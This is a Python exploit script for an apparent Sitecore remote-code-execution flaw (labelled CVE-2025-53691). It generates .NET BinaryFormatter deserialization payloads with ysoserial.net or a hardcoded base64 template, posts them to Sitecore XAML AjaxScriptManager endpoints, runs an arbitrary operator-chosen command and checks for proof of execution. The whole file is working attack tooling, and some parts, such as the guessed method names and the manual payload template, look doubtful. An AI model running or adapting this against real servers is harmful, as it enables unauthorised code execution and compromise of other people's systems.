#!/usr/bin/env python3

import requests
import json
import sys
import argparse
import urllib3
from urllib.parse import urljoin
import base64
import subprocess
import time
import os
import tempfile

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SitecoreRCEDeserialization:
    def __init__(self, target_url, timeout=20, verify_ssl=False):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest'
        })
        
        self.xaml_controls = [
            'Sitecore.Shell.Applications.Dialogs.ItemLister.ItemLister',
            'Sitecore.Shell.Applications.ContentEditor.ContentEditor',
            'Sitecore.Shell.Applications.WebEdit.WebEdit',
            'Sitecore.Shell.Applications.Dialogs.SelectItem.SelectItemDialog'
        ]
        
        self.deserialization_methods = [
            'ProcessSerializedData',
            'DeserializeViewState',
            'ProcessBinaryData',
            'HandleSerializedRequest',
            'LoadSerializedObject',
            'ProcessFormData'
        ]

    def check_xaml_access(self, control_path):
        xaml_endpoint = f"/-/xaml/{control_path}"
        url = urljoin(self.target_url, xaml_endpoint)
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
            
            if response.status_code == 200:
                content = response.text.lower()
                if any(indicator in content for indicator in ['sitecore', 'xaml', 'ajaxscriptmanager', 'viewstate']):
                    return True, response
            elif response.status_code == 500:
                if 'sitecore' in response.text.lower():
                    return True, response
                    
        except requests.RequestException:
            pass
            
        return False, None

    def generate_ysoserial_payload(self, command, gadget='TypeConfuseDelegate'):
        ysoserial_path = '/home/ubuntu/ysoserial-1dba9c4416ba31b5b2bb3dcf9d0df1b1a8c8c7e2.exe'
        
        if not os.path.exists(ysoserial_path):
            print(f"[!] ysoserial.net not found at {ysoserial_path}")
            return self.generate_manual_payload(command)
            
        try:
            cmd = [
                'mono', ysoserial_path,
                '-f', 'BinaryFormatter',
                '-g', gadget,
                '-o', 'base64',
                '-c', command
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
            else:
                print(f"[!] ysoserial.net failed: {result.stderr}")
                return self.generate_manual_payload(command)
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            print("[!] ysoserial.net execution failed, using manual payload")
            return self.generate_manual_payload(command)

    def generate_manual_payload(self, command):
        payload_template = '''
        AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA{COMMAND_B64}CwA=
        '''
        
        command_b64 = base64.b64encode(command.encode()).decode()
        payload = payload_template.replace('{COMMAND_B64}', command_b64).replace('\n', '').replace(' ', '')
        
        return payload

    def build_ajax_payload(self, method_name, parameters):
        ajax_params = {
            'method': method_name,
            'parameters': parameters
        }
        return json.dumps(ajax_params, separators=(',', ':'))

    def execute_deserialization_attack(self, control_path, method_name, serialized_payload):
        xaml_endpoint = f"/-/xaml/{control_path}"
        url = urljoin(self.target_url, xaml_endpoint)
        
        ajax_payload = self.build_ajax_payload(method_name, [serialized_payload])
        
        data = {
            '__SOURCE': control_path.split('.')[-1],
            '__PARAMETERS': ajax_payload
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': url,
            'Origin': self.target_url
        }
        
        try:
            response = self.session.post(
                url, 
                data=data, 
                headers=headers, 
                timeout=self.timeout, 
                verify=self.verify_ssl
            )
            
            return {
                'status_code': response.status_code,
                'response_text': response.text,
                'headers': dict(response.headers),
                'success': response.status_code in [200, 500],
                'execution_indicators': self.check_execution_indicators(response.text)
            }
            
        except requests.RequestException as e:
            return {
                'status_code': None,
                'response_text': str(e),
                'headers': {},
                'success': False,
                'execution_indicators': []
            }

    def check_execution_indicators(self, response_text):
        indicators = []
        
        execution_patterns = [
            'system.diagnostics.process',
            'cmd.exe',
            'powershell',
            'system.io.file',
            'system.reflection',
            'deserializationexception',
            'binaryformatter',
            'typeconfusedelegate'
        ]
        
        response_lower = response_text.lower()
        
        for pattern in execution_patterns:
            if pattern in response_lower:
                indicators.append(pattern)
                
        return indicators

    def verify_rce(self, command_output_marker):
        verification_endpoints = [
            '/sitecore/admin/logs.aspx',
            '/sitecore/admin/cache.aspx',
            '/temp/',
            '/App_Data/logs/'
        ]
        
        for endpoint in verification_endpoints:
            url = urljoin(self.target_url, endpoint)
            try:
                response = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
                if command_output_marker in response.text:
                    return True, endpoint, response.text
            except requests.RequestException:
                continue
                
        return False, None, None

    def exploit(self, command='whoami'):
        print(f"[*] Testing CVE-2025-53691 against: {self.target_url}")
        print("[*] Sitecore RCE via Deserialization in AjaxScriptManager")
        
        accessible_controls = []
        
        print("\n[*] Testing XAML control accessibility...")
        for control in self.xaml_controls:
            print(f"[*] Testing: {control}")
            accessible, response = self.check_xaml_access(control)
            if accessible:
                print(f"[+] Accessible: {control}")
                accessible_controls.append(control)
            else:
                print(f"[-] Not accessible: {control}")
                
        if not accessible_controls:
            print("[-] No accessible XAML controls found")
            return False
            
        target_control = accessible_controls[0]
        print(f"\n[+] Using control: {target_control}")
        
        print(f"[*] Generating deserialization payload for command: {command}")
        
        serialized_payload = self.generate_ysoserial_payload(command)
        
        if not serialized_payload:
            print("[-] Failed to generate serialized payload")
            return False
            
        print(f"[*] Payload length: {len(serialized_payload)} characters")
        print(f"[*] Payload preview: {serialized_payload[:100]}...")
        
        successful_attacks = []
        
        print("\n[*] Testing deserialization methods...")
        for method_name in self.deserialization_methods:
            print(f"[*] Testing method: {method_name}")
            
            result = self.execute_deserialization_attack(
                target_control, 
                method_name, 
                serialized_payload
            )
            
            if result['success']:
                print(f"[+] Method {method_name} executed successfully!")
                print(f"[*] Response status: {result['status_code']}")
                
                if result['execution_indicators']:
                    print(f"[+] Execution indicators found: {', '.join(result['execution_indicators'])}")
                    
                successful_attacks.append({
                    'method': method_name,
                    'result': result
                })
                
                if len(result['execution_indicators']) > 0:
                    print(f"[+] POTENTIAL RCE ACHIEVED via {method_name}!")
                    
                    command_marker = f"rce_test_{int(time.time())}"
                    verification_command = f'echo {command_marker} > /tmp/rce_proof.txt'
                    
                    print(f"[*] Attempting verification with command: {verification_command}")
                    verification_payload = self.generate_ysoserial_payload(verification_command)
                    
                    if verification_payload:
                        verify_result = self.execute_deserialization_attack(
                            target_control, 
                            method_name, 
                            verification_payload
                        )
                        
                        if verify_result['success']:
                            time.sleep(3)
                            verified, endpoint, content = self.verify_rce(command_marker)
                            
                            if verified:
                                print(f"[+] RCE CONFIRMED! Evidence found at: {endpoint}")
                                return {
                                    'vulnerable': True,
                                    'rce_confirmed': True,
                                    'control_used': target_control,
                                    'method_used': method_name,
                                    'command_executed': command,
                                    'verification_endpoint': endpoint,
                                    'all_successful_methods': successful_attacks
                                }
            else:
                print(f"[-] Method {method_name} failed")
                
        if successful_attacks:
            print(f"\n[+] DESERIALIZATION VULNERABILITY CONFIRMED!")
            print(f"[+] {len(successful_attacks)} methods successfully executed")
            print("[!] RCE likely possible but not fully verified")
            
            return {
                'vulnerable': True,
                'rce_confirmed': False,
                'control_used': target_control,
                'successful_methods': successful_attacks,
                'command_attempted': command
            }
        else:
            print("[-] No deserialization methods were successful")
            return False

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-53691 Sitecore RCE via Deserialization Exploit')
    parser.add_argument('target', help='Target Sitecore URL (e.g., https://target.com)')
    parser.add_argument('--command', default='whoami', help='Command to execute (default: whoami)')
    parser.add_argument('--timeout', type=int, default=20, help='Request timeout (default: 20)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification')
    parser.add_argument('--output', help='Output file for results (JSON format)')
    
    args = parser.parse_args()
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'https://' + args.target
        
    exploit = SitecoreRCEDeserialization(
        target_url=args.target,
        timeout=args.timeout,
        verify_ssl=not args.no_ssl_verify
    )
    
    try:
        result = exploit.exploit(args.command)
        
        if args.output and result:
            with open(args.output, 'w') as f:
                json.dump(result, f, indent=2, default=str)
            print(f"\n[+] Results saved to: {args.output}")
            
        return 0 if result else 1
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 1
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1

if __name__ == '__main__':
    sys.exit(main())
